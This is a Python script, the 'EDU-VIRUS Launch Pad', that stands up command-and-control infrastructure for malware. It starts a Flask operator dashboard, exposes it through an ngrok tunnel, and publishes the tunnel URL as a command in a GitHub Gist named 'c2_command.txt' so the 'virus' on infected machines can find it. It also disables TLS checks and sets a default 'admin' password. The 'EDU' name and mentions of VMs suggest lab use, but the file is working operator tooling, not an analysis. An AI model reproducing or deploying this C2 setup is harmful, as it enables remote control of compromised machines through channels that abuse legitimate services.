#!/usr/bin/env python3
"""
EDU-VIRUS Launch Pad — one-click dashboard + ngrok tunnel
Double-click this file to start everything.

What it does:
  1. Starts the Flask dashboard on port 5000
  2. Downloads/launches ngrok to expose it
  3. Sets the ngrok URL in the Gist so VMs find you
  4. Opens your browser to the dashboard

Requirements: Python, GitHub CLI (gh) — already on your system.
"""

import os
import sys
import json
import time
import subprocess
import threading
import webbrowser
import urllib.request
import ssl
import tempfile
import shutil
import zipfile
from pathlib import Path

BASE_DIR = Path(__file__).parent.resolve()
NGROK_PATH = BASE_DIR / "ngrok.exe"
GIST_ID = "99a46fc04b180fffdafc03584c0d5a2e"
GIST_FILE = "c2_command.txt"

_SSL_CTX = ssl._create_unverified_context()
PASSWORD = os.environ.get("PASSWORD", "admin")


def print_banner():
    print("""
  ╔══════════════════════════════════════╗
  ║        EDU-VIRUS LAUNCH PAD          ║
  ║      One click to rule them all      ║
  ╚══════════════════════════════════════╝
    """)


def check_deps():
    """Check if everything we need is available."""
    # Check Python
    print(f"[✓] Python {sys.version.split()[0]}")

    # Check gh CLI
    try:
        r = subprocess.run(["gh", "--version"], capture_output=True, text=True, timeout=5)
        print(f"[✓] GitHub CLI — {r.stdout.split()[1] if r.stdout else 'ok'}")
    except:
        print("[✗] GitHub CLI not found. Install: winget install GitHub.cli")
        return False

    # Check flask
    try:
        import flask
        print(f"[✓] Flask {flask.__version__}")
    except ImportError:
        print("[ ] Installing Flask...")
        subprocess.run([sys.executable, "-m", "pip", "install", "flask"], check=True)
        print("[✓] Flask installed")

    # Check if ngrok exists, download if not
    if not NGROK_PATH.exists():
        print("[ ] Downloading ngrok...")
        try:
            url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
            zip_path = BASE_DIR / "ngrok.zip"
            urllib.request.urlretrieve(url, zip_path, context=_SSL_CTX)
            with zipfile.ZipFile(zip_path, "r") as zf:
                zf.extract("ngrok.exe", BASE_DIR)
            zip_path.unlink()
            print(f"[✓] ngrok {os.path.getsize(NGROK_PATH) / 1048576:.1f} MB")
        except Exception as e:
            print(f"[✗] ngrok download failed: {e}")
            print("[ ] Download manually from https://ngrok.com/download and put ngrok.exe in this folder")
            return False
    else:
        print(f"[✓] ngrok {os.path.getsize(NGROK_PATH) / 1048576:.1f} MB")

    return True


def wait_for_ngrok_url(timeout=30):
    """Poll ngrok API until we get the public URL."""
    print("[ ] Waiting for ngrok tunnel...", end="", flush=True)
    start = time.time()

    while time.time() - start < timeout:
        try:
            req = urllib.request.Request(
                "http://127.0.0.1:4040/api/tunnels",
                headers={"User-Agent": "Mozilla/5.0"},
            )
            resp = urllib.request.urlopen(req, timeout=3, context=_SSL_CTX)
            data = json.loads(resp.read().decode())

            for tunnel in data.get("tunnels", []):
                if tunnel.get("public_url", "").startswith("https"):
                    url = tunnel["public_url"].rstrip("/")
                    print(f"\r[✓] ngrok tunnel: {url}")
                    return url
        except Exception:
            pass

        print(".", end="", flush=True)
        time.sleep(1)

    print("\r[✗] ngrok tunnel didn't start in time")
    return None


def set_gist_ngrok_url(ngrok_url):
    """Write the ngrok URL to the Gist so VMs find you."""
    cmd_id = str(int(time.time() * 1000))
    payload = {
        "description": f"EDU-Virus C2 - live at {ngrok_url}",
        "files": {
            GIST_FILE: {
                "content": json.dumps({
                    "cmd": "set_ngrok",
                    "args": [ngrok_url],
                    "id": cmd_id,
                })
            }
        }
    }

    tmp = os.path.join(tempfile.gettempdir(), "gist_launch.json")
    with open(tmp, "w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["gh", "api", "-X", "PATCH", f"gists/{GIST_ID}",
         "--input", tmp, "--jq", f'.files["{GIST_FILE}"].content'],
        capture_output=True, text=True, timeout=15,
    )
    os.unlink(tmp)

    if r.returncode == 0:
        print(f"[✓] Gist updated with ngrok URL")
        print(f"    Virus will pick this up within 15s")
        return True
    else:
        print(f"[✗] Failed to update Gist: {r.stderr[:100]}")
        return False


def start_dashboard():
    """Start the Flask dashboard in a subprocess."""
    env = os.environ.copy()
    env["PASSWORD"] = PASSWORD
    dashboard = BASE_DIR / "dashboard.py"
    p = subprocess.Popen(
        [sys.executable, str(dashboard)],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    time.sleep(2)

    # Verify it started
    if p.poll() is None:
        print("[✓] Dashboard running on http://127.0.0.1:5000")
        return p
    else:
        out, err = p.communicate(timeout=3)
        print(f"[✗] Dashboard failed: {err.decode()[:200]}")
        return None


def start_ngrok():
    """Start ngrok tunnel to port 5000 in a subprocess."""
    p = subprocess.Popen(
        [str(NGROK_PATH), "http", "5000", "--log", "stdout"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(3)

    if p.poll() is None:
        return p
    return None


def main():
    print_banner()

    if not check_deps():
        input("\nPress Enter to exit...")
        sys.exit(1)

    print()

    # Step 1: Start dashboard
    print("[1/4] Starting dashboard...")
    dash_proc = start_dashboard()
    if not dash_proc:
        input("\nPress Enter to exit...")
        sys.exit(1)

    # Step 2: Start ngrok
    print("[2/4] Starting ngrok tunnel...")
    ngrok_proc = start_ngrok()
    if not ngrok_proc:
        print("[!] ngrok might already be running, trying to get URL...")

    # Step 3: Get the ngrok URL
    print("[3/4] Getting ngrok URL...")
    ngrok_url = wait_for_ngrok_url(timeout=20)

    if ngrok_url:
        # Step 4: Write it to Gist
        print("[4/4] Updating Gist with ngrok URL...")
        set_gist_ngrok_url(ngrok_url)

        # Open browser
        print("\n  ─────────────────────────────────────")
        print(f"  DASHBOARD:  http://127.0.0.1:5000")
        print(f"  PASSWORD:   {PASSWORD}")
        print(f"  NGROK URL:  {ngrok_url}")
        print(f"  GIST:       https://gist.github.com/vLoon-jpg/{GIST_ID}")
        print("  ─────────────────────────────────────")
        print()
        print("  VMs will find you automatically within 15s!")
        print("  Press Ctrl+C to stop everything.")
        print()

        webbrowser.open("http://127.0.0.1:5000")
    else:
        print()
        print(f"  DASHBOARD:  http://127.0.0.1:5000")
        print(f"  PASSWORD:   {PASSWORD}")
        print()
        print("  ngrok didn't start. You can:")
        print("  1. Download from https://ngrok.com/download")
        print("  2. Run: ngrok http 5000")
        print("  3. Run: python set-ngrok <your_ngrok_url>")
        print()

    # Keep running until Ctrl+C
    try:
        while True:
            time.sleep(1)
            # Check if processes are alive
            if dash_proc and dash_proc.poll() is not None:
                print("[!] Dashboard died. Restarting...")
                dash_proc = start_dashboard()
    except KeyboardInterrupt:
        print("\n\nShutting down...")
        if dash_proc:
            dash_proc.terminate()
        if ngrok_proc:
            ngrok_proc.terminate()
        print("Done. Bye!")


if __name__ == "__main__":
    main()
